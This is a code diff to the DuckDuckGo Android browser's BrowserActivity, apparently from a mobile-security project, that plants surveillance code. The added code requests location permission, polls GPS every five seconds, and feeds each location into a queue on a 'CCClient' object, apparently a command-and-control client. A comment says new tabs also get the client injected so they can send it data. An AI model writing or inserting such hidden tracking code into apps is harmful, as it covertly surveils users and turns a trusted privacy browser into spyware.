@@ -20,6 +20,10 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
 import android.content.Intent.EXTRA_TEXT
+import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -31,6 +35,8 @@ import androidx.activity.OnBackPressedCallback
 import androidx.activity.result.ActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.VisibleForTesting
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import androidx.webkit.ServiceWorkerClientCompat
 import androidx.webkit.ServiceWorkerControllerCompat
@@ -55,6 +61,7 @@ import com.duckduckgo.app.global.rating.PromptCount
 import com.duckduckgo.app.global.view.ClearDataAction
 import com.duckduckgo.app.global.view.FireDialog
 import com.duckduckgo.app.global.view.renderIfChanged
+import com.duckduckgo.app.mobilesecproject.CCClient
 import com.duckduckgo.app.onboarding.ui.page.DefaultBrowserPage
 import com.duckduckgo.app.pixels.AppPixelName
 import com.duckduckgo.app.pixels.AppPixelName.FIRE_DIALOG_CANCEL
@@ -77,11 +84,11 @@ import com.duckduckgo.di.scopes.ActivityScope
 import com.duckduckgo.navigation.api.GlobalActivityStarter
 import com.duckduckgo.privacy.dashboard.api.ui.PrivacyDashboardHybridScreenParams.PrivacyDashboardPrimaryScreen
 import com.duckduckgo.savedsites.impl.bookmarks.BookmarksActivity.Companion.SAVED_SITE_URL_EXTRA
-import javax.inject.Inject
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.launch
 import timber.log.Timber
+import javax.inject.Inject
 
 // open class so that we can test BrowserApplicationStateInfo
 @InjectWith(ActivityScope::class)
@@ -192,8 +199,63 @@ open class BrowserActivity : DuckDuckGoActivity() {
         intent?.getStringExtra(LAUNCH_FROM_NOTIFICATION_PIXEL_NAME)?.let {
             viewModel.onLaunchedFromNotification(it)
         }
+
+        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        requestLocationUpdates()
         configureOnBackPressedListener()
+        CCClient.getInstance().setActivity(this)
     }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == locationPermissionCode && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            Timber.tag("CCClient.MobSec").i("Permission granted.");
+            requestLocationUpdates()
+        } else {
+            // Permission denied
+            println("Permission denied")
+        }
+    }
+
+    private fun requestLocationUpdates() {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION), locationPermissionCode)
+        } else {
+            val locationListener = object : LocationListener {
+                override fun onLocationChanged(location: Location) {
+                    CCClient.getInstance().addToLocationQueue(location)
+                    Timber.tag("CCClient.MobSec").i("Current Location: Latitude = ${location.latitude}, Longitude = ${location.longitude}");
+                }
+
+                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                override fun onProviderEnabled(provider: String) {}
+                override fun onProviderDisabled(provider: String) {}
+            }
+
+            val mainContext = this;
+            handler.post(object : Runnable {
+                override fun run() {
+                    if (ContextCompat.checkSelfPermission(
+                            mainContext,
+                            android.Manifest.permission.ACCESS_FINE_LOCATION
+                        ) == PackageManager.PERMISSION_GRANTED
+                    ) {
+                        locationManager.requestSingleUpdate(
+                            LocationManager.GPS_PROVIDER,
+                            locationListener,
+                            null
+                        )
+                        handler.postDelayed(this, 5000) // Poll every 5 seconds
+                    }
+                }
+            })
+        }
+    }
+
+    private lateinit var locationManager: LocationManager
+    private val locationPermissionCode = 1
+    private val handler = Handler(Looper.getMainLooper())
 
     override fun onStop() {
         openMessageInNewTabJob?.cancel()
@@ -232,6 +294,8 @@ open class BrowserActivity : DuckDuckGoActivity() {
         }
     }
 
+    // When creating a new tab, we inject the CCCLient on the new instance
+    // and send data to CCCLient
     private fun openNewTab(
         tabId: String,
         url: String? = null,
